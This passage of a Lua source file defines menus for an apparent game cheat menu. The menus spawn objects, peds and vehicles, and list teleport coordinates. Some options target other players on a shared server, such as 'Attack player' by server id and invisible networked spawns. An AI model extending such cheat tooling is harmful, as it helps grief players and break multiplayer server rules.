            {text = 'Loop spawn', dkey = 'spawning:objectspawner_loop', desc = 'Loop spawn a picked category.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'What object to loop', length = 10, tipus = 'betu', toggle = false, func = {'Custom', 'Default'}},
            {text = 'Coords', dkey = 'spawning:objectspawner_coords', desc = 'Spawn the object to the specified\ncoords.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Spawn coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Delete', dkey = 'spawning:objectspawner_delete', desc = 'Delete every spawned object.', afu = __REAPER1__.M.spawning.objectspawner.delete, option = __REAPER1__.M.Button},
            {text = 'Delete last', dkey = 'spawning:objectspawner_deletelast', desc = 'Delete the last spawned object.', afu = __REAPER1__.M.spawning.objectspawner.deletelast, option = __REAPER1__.M.Button},
            {text = 'Parameters', option = __REAPER1__.M.Separator},
            {text = 'Networked', dkey = 'spawning:objectspawner_networked', desc = 'Set the spawned object networked:\nVisible for other players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Mission entity', dkey = 'spawning:objectspawner_missionentity', desc = 'Make it so when you walk/look away\nthe object won\'t despawn.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Dynamic', dkey = 'spawning:objectspawner_dynamic', desc = 'Set the object dynamic.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invisible', dkey = 'spawning:objectspawner_invisible', desc = 'Spawn the object invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God mode', dkey = 'spawning:objectspawner_godmode', desc = 'Spawn the object god moded.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Existing', option = __REAPER1__.M.Separator},
            {text = 'Toggle visibility', dkey = 'spawning:objectspawner_togglevis', desc = 'Toggle the visibility of the spawned\nobjects.', afu = __REAPER1__.M.spawning.objectspawner.togglevis, option = __REAPER1__.M.Button},
            {text = 'Toggle god mode', dkey = 'spawning:objectspawner_togglegod', desc = 'Toggle the god mode of the spawned\nobjects.', afu = __REAPER1__.M.spawning.objectspawner.togglegod, option = __REAPER1__.M.Button},
        },

        ['spawning:pedspawner'] = {
            {text = 'Custom', dkey = 'spawning:pedspawner_custom', desc = 'Enter a ped name to spawn.', afu = __REAPER1__.M.spawning.pedspawner.spawn, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Ped name', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Pedestrian', dkey = 'spawning:pedspawner_pedestrian', desc = 'Spawn a picked pedestrian.', afu = __REAPER1__.M.spawning.pedspawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ped name', length = 50, tipus = 'vegyes', func = {'Male freemode','Female freemode','Big foot', 'Alien','Spaceman','Bogdangoon','Gunman','Corpse','Cult','Nude','Cult 2','Cult 3','Merryweather','Maude','Stripper 1','Stripper 2','Chemistry worker','Cocaine','Stripper 3','Stripper 4','Clown','Lester','Monkey','Juggernaut','Ranger','Zombie'}},
            {text = 'Loop spawn', dkey = 'spawning:pedspawner_loop', desc = 'Loop spawn a picked category.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'What ped to loop', length = 10, tipus = 'betu', toggle = false, func = {'Custom', 'Default'}},
            {text = 'Coords', dkey = 'spawning:pedspawner_coords', desc = 'Spawn the ped to the specified\ncoords.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Spawn coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Heading', dkey = 'spawning:pedspawner_heading', desc = 'Spawn the ped with a picked\nheading.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heading number', length = 4, tipus = 'vegyes', func = {'None', 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360}},
            {text = 'Delete', dkey = 'spawning:pedspawner_delete', desc = 'Delete every spawned ped.', afu = __REAPER1__.M.spawning.pedspawner.delete, option = __REAPER1__.M.Button},
            {text = 'Delete last', dkey = 'spawning:pedspawner_deletelast', desc = 'Delete the last spawned ped.', afu = __REAPER1__.M.spawning.pedspawner.deletelast, option = __REAPER1__.M.Button},
            {text = 'Parameters', option = __REAPER1__.M.Separator},
            {text = 'Networked', dkey = 'spawning:pedspawner_networked', desc = 'Set the spawned peds networked:\nVisible for other players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Mission entity', dkey = 'spawning:pedspawner_missionentity', desc = 'Make it so when you walk/look away\nthe ped won\'t despawn.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invisible', dkey = 'spawning:pedspawner_invisible', desc = 'Spawn the ped invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God mode', dkey = 'spawning:pedspawner_godmode', desc = 'Spawn the ped god moded.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Weapon', dkey = 'spawning:pedspawner_weapon', desc = 'Spawn the ped with a weapon.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 20, tipus = 'betu', toggle = false, func = __REAPER1__.T.Weapons},
            {text = 'Randomized clothing', dkey = 'spawning:pedspawner_randomclothing', desc = 'Spawn the ped with random clothing.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Condition', dkey = 'spawning:pedspawner_condition', desc = 'Spawn the ped with a selected condition.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Condition name', length = 20, tipus = 'betu', toggle = false, func = {'Angry', 'Deaf', 'Blind', 'Deaf & Blind'}},
            {text = 'Animation', dkey = 'spawning:pedspawner_animation', desc = 'Spawn the ped with a selected animation\nplaying.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animation name', length = 20, tipus = 'betu', toggle = false, func = {'Sex', 'Sex 2', 'Twerking', 'Thinking', 'Pointing', 'Clapping', 'Whistle', 'Dead', 'Sleeping', 'Jerking off', 'Lap dance', 'Lean', 'Kiss', 'Hug'}},
            {text = 'Spawn in vehicle', dkey = 'spawning:pedspawner_spawninveh', desc = 'Spawn the ped in a vehicle.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Vehicle name', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Existing', option = __REAPER1__.M.Separator},
            {text = 'Weapon', dkey = 'spawning:pedspawner_eweapon', desc = 'Give or remove a weapon for the spawned\npeds.', afu = __REAPER1__.M.spawning.pedspawner.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 20, tipus = 'betu', func = __REAPER1__.T.Weapons},
            {text = 'Stop animation', dkey = 'spawning:pedspawner_stopanimation', desc = 'Stop the animation the spawned peds\nare playing.', afu = __REAPER1__.M.spawning.pedspawner.stopanim, option = __REAPER1__.M.Button},
            {text = 'Animation', dkey = 'spawning:pedspawner_eanimation', desc = 'Force the spawned peds to play an\nanimation.', afu = __REAPER1__.M.spawning.pedspawner.animation, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animation name', length = 20, tipus = 'betu', func = {'Sex', 'Sex 2', 'Twerking', 'Thinking', 'Pointing', 'Clapping', 'Whistle', 'Dead', 'Sleeping', 'Jerking off', 'Lap dance', 'Lean', 'Kiss', 'Hug'}},
            {text = 'Follow closest', dkey = 'spawning:pedspawner_followclosest', desc = 'Force the spawned peds to follow the\nclosest player.', afu = __REAPER1__.M.spawning.pedspawner.follow, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Mind clear', dkey = 'spawning:pedspawner_mindclear', desc = 'Force stop whatever the spawned peds\nare doing.', afu = __REAPER1__.M.spawning.pedspawner.mindclear, option = __REAPER1__.M.Button},
            {text = 'Condition', dkey = 'spawning:pedspawner_econdition', desc = 'Force a condition for the spawned peds.', afu = __REAPER1__.M.spawning.pedspawner.condition, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Condition name', length = 20, tipus = 'betu', func = {'Angry', 'Deaf', 'Blind', 'Deaf & Blind'}},
            {text = 'Attack player', dkey = 'spawning:pedspawner_attackplayer', desc = 'Attack a player with the given server id.', afu = __REAPER1__.M.spawning.pedspawner.attack, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Player id number', length = 5, tipus = 'szam', func = 0},
            {text = 'Freeze', dkey = 'spawning:pedspawner_freeze', desc = 'Freeze the spawned peds.', afu = __REAPER1__.M.spawning.pedspawner.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Ragdoll', dkey = 'spawning:pedspawner_ragdoll', desc = 'Ragdoll the spawned peds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Randomize clothing', dkey = 'spawning:pedspawner_erandomclothing', desc = 'Randomize the peds\' clothing.', afu = __REAPER1__.M.spawning.pedspawner.randomizeclothing, option = __REAPER1__.M.Button},
            {text = 'Toggle visibility', dkey = 'spawning:pedspawner_togglevis', desc = 'Toggle the visibility of the spawned peds.', afu = __REAPER1__.M.spawning.pedspawner.togglevis, option = __REAPER1__.M.Button},
            {text = 'Toggle god mode', dkey = 'spawning:pedspawner_togglegod', desc = 'Toggle the god mode of the spawned\npeds.', afu = __REAPER1__.M.spawning.pedspawner.togglegod, option = __REAPER1__.M.Button},
            {text = 'Put in vehicle', dkey = 'spawning:pedspawner_putinveh', desc = 'Put the peds into a vehicle.', afu = __REAPER1__.M.spawning.pedspawner.putinveh, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Vehicle name', length = 30, tipus = 'vegyes', func = 'None'},
        },

        ['spawning:vehiclespawner'] = {
            {text = 'Custom', dkey = 'spawning:vehiclespawner_custom', desc = 'Enter a vehicle name to spawn.', afu = __REAPER1__.M.spawning.vehiclespawner.spawn, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Vehicle name', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Vehicle', dkey = 'spawning:vehiclespawner_vehicle', desc = 'Spawn a picked vehicle.', afu = __REAPER1__.M.spawning.vehiclespawner.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle name', length = 50, tipus = 'vegyes', func = {'Bmx','Fire truck','Dump truck','Rc bandito','Bus','Tornado','Neon','Blista', 'Panto','Tractor','Train','Metro train', 'Ruiner','Bati','Nightblade','Barracks','Tank','Riot','Thruster','Faggio','Sanczhez','Ratloader', 'Dukes', 'Dubsta 6x6','Dune','Monster truck','Mesa','Baller','Toros', 'Patriot limo','Rally truck', 'Tourbus','Buffalo','Armored kuruma','Raptor','Adder', 'T20','Vigilante','Voltic','Zentorno','Caddy', 'Shitty van','Clown van'}},
            {text = 'Loop spawn', dkey = 'spawning:vehiclespawner_loop', desc = 'Loop spawn a picked category.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'What vehicle to loop', length = 10, tipus = 'betu', toggle = false, func = {'Custom', 'Default'}},
            {text = 'Coords', dkey = 'spawning:vehiclespawner_coords', desc = 'Spawn the vehicle to the specified\ncoords.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Spawn coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Heading', dkey = 'spawning:vehiclespawner_heading', desc = 'Spawn the vehicle with a picked\nheading.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heading number', length = 4, tipus = 'vegyes', func = {'None', 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360}},
            {text = 'Delete', dkey = 'spawning:vehiclespawner_delete', desc = 'Delete every spawned vehicle.', afu = __REAPER1__.M.spawning.vehiclespawner.delete, option = __REAPER1__.M.Button},
            {text = 'Delete last', dkey = 'spawning:vehiclespawner_deletelast', desc = 'Delete the last spawned vehicle.', afu = __REAPER1__.M.spawning.vehiclespawner.deletelast, option = __REAPER1__.M.Button},
            {text = 'Parameters', option = __REAPER1__.M.Separator},
            {text = 'Networked', dkey = 'spawning:vehiclespawner_networked', desc = 'Set the spawned vehicles networked:\nVisible for other players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Mission entity', dkey = 'spawning:vehiclespawner_missionentity', desc = 'Make it so when you walk/look away the\nvehicle won\'t despawn.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invisible', dkey = 'spawning:vehiclespawner_invisible', desc = 'Spawn the vehicle invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God mode', dkey = 'spawning:vehiclespawner_godmode', desc = 'Spawn the vehicle god moded.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Fucked up', dkey = 'spawning:vehiclespawner_fuckedup', desc = 'Spawn the vehicle fucked up.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Randomzied look', dkey = 'spawning:vehiclespawner_randomizedlook', desc = 'Spawn the vehicle with a randomized look.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Locked', dkey = 'spawning:vehiclespawner_locked', desc = 'Spawn the vehicle locked.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Existing', option = __REAPER1__.M.Separator},
            {text = 'Tune vehicle', dkey = 'spawning:vehiclespawner_tunevehicle', desc = 'Tune the spawned vehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.tuneveh, option = __REAPER1__.M.Button},
            {text = 'Randomize', dkey = 'spawning:vehiclespawner_randomize', desc = 'Randomize the look of the spawned\nvehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.randomize, option = __REAPER1__.M.Button},
            {text = 'Fuck up', dkey = 'spawning:vehiclespawner_fuckup', desc = 'Fuck up the spawned vehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.fuckup, option = __REAPER1__.M.Button},
            {text = 'Fix vehicle', dkey = 'spawning:vehiclespawner_fix', desc = 'Fix the spawned vehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.fix, option = __REAPER1__.M.Button},
            {text = 'Cruise (km/h)', dkey = 'spawning:vehiclespawner_maxspeed', desc = 'Set the spawned vehicle\'s maximum speed\nin km/h.', afu = __REAPER1__.M.spawning.vehiclespawner.maxspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle max speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set speed (km/h)', dkey = 'spawning:vehiclespawner_setspeed', desc = 'Set the spawned vehicle\'s current speed\nin km/h.', afu = __REAPER1__.M.spawning.vehiclespawner.setspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Remove wheels', dkey = 'spawning:vehiclespawner_removewheels', desc = 'Remove the wheels of the spawned\nvehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.removewheels, option = __REAPER1__.M.Button},
            {text = 'Freeze', dkey = 'spawning:vehiclespawner_freeze', desc = 'Freeze the spawned vehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Open door', dkey = 'spawning:vehiclespawner_open', desc = 'Open the specified door.', afu = __REAPER1__.M.spawning.vehiclespawner.opendoor, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 20, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Close door', dkey = 'spawning:vehiclespawner_close', desc = 'Close the specified door.', afu = __REAPER1__.M.spawning.vehiclespawner.closedoor, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 20, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Toggle lock', dkey = 'spawning:vehiclespawner_togglelock', desc = 'Toggle the lock of the spawned vehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.togglelock, option = __REAPER1__.M.Button},
            {text = 'Toggle visibility', dkey = 'spawning:vehiclespawner_togglevis', desc = 'Toggle the visibility of the spawned\nvehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.togglevis, option = __REAPER1__.M.Button},
            {text = 'Toggle god mode', dkey = 'spawning:vehiclespawner_togglegod', desc = 'Toggle the god mode of the spawned\nvehicles.', afu = __REAPER1__.M.spawning.vehiclespawner.togglegod, option = __REAPER1__.M.Button},
        },

        ['teleport'] = {
            {text = 'Keep vehicle', dkey = 'teleport_keepvehicle', desc = 'Draw only on entities.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Teleport to waypoint', dkey = 'teleport_teleporttowaypoint', desc = 'Teleport to your purple waypoint.', afu = __REAPER1__.M.teleport.tptowaypoint, option = __REAPER1__.M.Button},
            {text = 'Teleport to coords', dkey = 'teleport_teleporttocoords', desc = 'Teleport to the desired coordinates.', afu = __REAPER1__.M.teleport.tptocoords, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Teleport coordinates', length = 30, tipus = 'vegyes', func = '0.0 0.0 0.0'},
            {text = 'Locations', option = __REAPER1__.M.Separator},
            {text = 'Saved locations', dkey = 'teleport:savedlocations', desc = 'Saved locations menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:savedlocations'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Bunkers', dkey = 'teleport:bunkers', desc = 'Bunkers menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:bunkers'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Apartments', dkey = 'teleport:apartments', desc = 'Apartments menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:apartments'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Arcades', dkey = 'teleport:arcades', desc = 'Arcades menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:arcades'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Maze bank', dkey = 'teleport:mazebank', desc = 'Maze bank menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:mazebank'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Lom bank', dkey = 'teleport:lombank', desc = 'Lom bank menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:lombank'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Maze bank west', dkey = 'teleport:mazebankwest', desc = 'Maze bank west menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:mazebankwest'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Club & Warehouses', dkey = 'teleport:clubwarehouses', desc = 'Club & Warehouses menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:clubwarehouses'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Special', dkey = 'teleport:special', desc = 'Special menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:special'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Diamond casino', dkey = 'teleport:diamondcasino', desc = 'Diamond casino menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:diamondcasino'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Car garages', dkey = 'teleport:cargarages', desc = 'Car garages menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:cargarages'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Misc (no ipl)', dkey = 'teleport:misc', desc = 'Misc (no ipl) menu.', option = __REAPER1__.M.Menu_Button, func = {'teleport', 'teleport:misc'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Vehicle', option = __REAPER1__.M.Separator},
            {text = 'Only NPC', dkey = 'teleport_onlynpc', desc = 'Only teleport into NPC vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Nearest car (driver)', dkey = 'teleport_dnearestcar', desc = 'Teleport into the nearest car\'s driver\nseat.', afu = __REAPER1__.M.teleport.dnearestcar, option = __REAPER1__.M.Button},
            {text = 'Nearest car', dkey = 'teleport_nearestcar', desc = 'Teleport into the nearest car\'s any free\nseat.', afu = __REAPER1__.M.teleport.nearestcar, option = __REAPER1__.M.Button},
            {text = 'Nearest car to me', dkey = 'teleport_nearestcartome', desc = 'Teleport the nearest car to yourself.', afu = __REAPER1__.M.teleport.tnearestcar, option = __REAPER1__.M.Button},
            {text = 'Last vehicle', dkey = 'teleport_lastvehicle', desc = 'Teleport into the last vehicle you were\nsitting in.', afu = __REAPER1__.M.teleport.lastvehicle, option = __REAPER1__.M.Button},
            {text = 'Last vehicle to me', dkey = 'teleport_lastvehicletome', desc = 'Teleport the last vehicle you were sitting\nin to yourself.', afu = __REAPER1__.M.teleport.tlastvehicle, option = __REAPER1__.M.Button},
            {text = 'Directional', option = __REAPER1__.M.Separator},
            {text = 'Distance', dkey = 'teleport_distance', desc = 'The distance to directionally teleport.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Teleport distance number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Up', dkey = 'teleport_up', desc = 'Teleport directionally up.', afu = __REAPER1__.M.teleport.direction, option = __REAPER1__.M.Button, extra = 'up'},
            {text = 'Down', dkey = 'teleport_down', desc = 'Teleport directionally down.', afu = __REAPER1__.M.teleport.direction, option = __REAPER1__.M.Button, extra = 'down'},
            {text = 'Forward', dkey = 'teleport_forward', desc = 'Teleport directionally forward.', afu = __REAPER1__.M.teleport.direction, option = __REAPER1__.M.Button, extra = 'forward'},
            {text = 'Backward', dkey = 'teleport_backward', desc = 'Teleport directionally backward.', afu = __REAPER1__.M.teleport.direction, option = __REAPER1__.M.Button, extra = 'backward'},
            {text = 'Left', dkey = 'teleport_left', desc = 'Teleport directionally left.', afu = __REAPER1__.M.teleport.direction, option = __REAPER1__.M.Button, extra = 'left'},
            {text = 'Right', dkey = 'teleport_right', desc = 'Teleport directionally right.', afu = __REAPER1__.M.teleport.direction, option = __REAPER1__.M.Button, extra = 'right'},
        },

        ['teleport:savedlocations'] = {
            {text = 'Save location', dkey = 'teleport:savedlocations_savelocation', desc = 'Save your current location.', afu = __REAPER1__.M.teleport.saved.save, option = __REAPER1__.M.Button},
        },

        ['teleport:bunkers'] = {
            {text = 'Zancudo', dkey = 'teleport:bunkers_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-3058.714, 3329.19, 12.5844)},
            {text = 'Route68', dkey = 'teleport:bunkers_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(24.43542, 2959.705, 58.35517)},
            {text = 'Oilfields', dkey = 'teleport:bunkers_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(481.0465, 2995.135, 43.96672)},
            {text = 'Desert', dkey = 'teleport:bunkers_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(848.6175, 2996.567, 45.81612)},
            {text = 'Smoke tree', dkey = 'teleport:bunkers_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(2126.785, 3335.04, 48.21422)},
            {text = 'Scrapyard', dkey = 'teleport:bunkers_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(2493.654, 3140.399, 51.28789)},
            {text = 'Grapeseed', dkey = 'teleport:bunkers_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1823.961, 4708.14, 42.4991)},
            {text = 'Palleto', dkey = 'teleport:bunkers_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-783.0755, 5934.686, 24.31475)},
            {text = 'Route1', dkey = 'teleport:bunkers_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-3180.466, 1374.192, 19.9597)},
            {text = 'Farmhouse', dkey = 'teleport:bunkers_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1570.372, 2254.549, 78.89397)},
            {text = 'Raton canyon', dkey = 'teleport:bunkers_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-391.3216, 4363.728, 58.65862)}
        },

        ['teleport:apartments'] = {
            {text = 'Modern 1 apartment', dkey = 'teleport:apartments_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.8663, 315.7642, 217.6385)},
            {text = 'Modern 2 apartment', dkey = 'teleport:apartments_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.9563, 315.6229, 187.9136)},
            {text = 'Modern 3 apartment', dkey = 'teleport:apartments_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-774.0126, 342.0428, 196.6864)},
            {text = 'Mody 1 apartment', dkey = 'teleport:apartments_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-787.0749, 315.8198, 217.6386)},
            {text = 'Mody 2 apartment', dkey = 'teleport:apartments_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.8195, 315.5634, 187.9137)},
